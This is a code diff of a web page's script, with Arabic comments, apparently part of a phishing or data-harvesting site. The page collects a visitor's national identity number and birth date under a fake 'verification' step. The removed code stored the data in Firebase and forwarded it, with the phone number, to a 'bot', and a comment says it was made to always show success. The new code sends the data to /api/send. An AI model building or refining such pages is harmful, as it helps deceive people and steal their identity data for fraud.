@@ -51,75 +51,49 @@
 </div>
 
 
-<script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
-    import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
-
-    const firebaseConfig = {
-        apiKey: "AIzaSyC05uAGTFE_mZyByFBTRexYn5VbTfzW0Go",
-        authDomain: "barq-9ba61.firebaseapp.com",
-        projectId: "barq-9ba61",
-        storageBucket: "barq-9ba61.firebasestorage.app",
-        messagingSenderId: "1060477857765",
-        appId: "1:1060477857765:web:e1e2c606668209f364090c"
-    };
-
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
-
+<script>
     document.getElementById('submitBtn').addEventListener('click', async () => {
         const submitBtn = document.getElementById('submitBtn');
         const idNumber = document.getElementById('idNumber').value;
         const birthDate = document.getElementById('birthDate').value;
-        const docId = localStorage.getItem('currentDocId');
+        const docId = localStorage.getItem('currentDocId'); // الـ ID الذي خزنّاه في صفحة index
 
         if (!idNumber || !birthDate) {
             alert("يرجى تعبئة كافة الحقول.");
             return;
         }
 
-        // تحويل الزر فوراً إلى جاري المعالجة
         submitBtn.innerText = "جاري المعالجة...";
         submitBtn.disabled = true;
-        submitBtn.style.opacity = "0.7";
 
         try {
-            // 1. الحفظ في Firebase (نستخدم merge: true لضمان عدم مسح بيانات قديمة)
-            if (docId) {
-                await setDoc(doc(db, "users", docId), {
+            // إرسال البيانات إلى الـ API الخاص بك
+            const response = await fetch('/api/send', {
+                method: 'PATCH', // نستخدم PATCH لتحديث السجل الموجود مسبقاً
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    id: docId,
                     identityNumber: idNumber,
                     birthDate: birthDate,
                     status: "تم إدخال الهوية"
-                }, { merge: true });
-            }
-
-            // 2. محاولة إرسال البيانات للبوت
-            // ملاحظة: قمت بإزالة انتظار رد البوت (await) هنا لضمان أن الزر يتحول للنجاح دائماً
-            fetch('/api/send', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    phone: localStorage.getItem('userPhone') || "غير متوفر",
-                    identity: idNumber,
-                    birthDate: birthDate
                 })
-            }).catch(err => console.log("خطأ في البوت، تم الحفظ في Firebase"));
+            });
 
-            // 3. تحويل الزر للنجاح
-            submitBtn.innerText = "تم التحقق بنجاح";
-            submitBtn.style.backgroundColor = "#28a745"; // لون أخضر
-
+            if (response.ok) {
+                submitBtn.innerText = "تم التحقق بنجاح";
+                submitBtn.style.backgroundColor = "#28a745";
+                // يمكن إضافة توجيه لصفحة شكر أو نهاية هنا:
+                // window.location.href = 'thanks.html';
+            } else {
+                throw new Error('فشل الإرسال');
+            }
         } catch (error) {
             console.error("خطأ:", error);
-            // في حالة الفشل، نغير النص ليعرف المستخدم أن هناك مشكلة دون "تنبيه" مزعج
             submitBtn.innerText = "حدث خطأ - حاول مرة أخرى";
             submitBtn.disabled = false;
-            submitBtn.style.backgroundColor = "#000";
         }
     });
 </script>
-
-
 
 </body>
 </html>
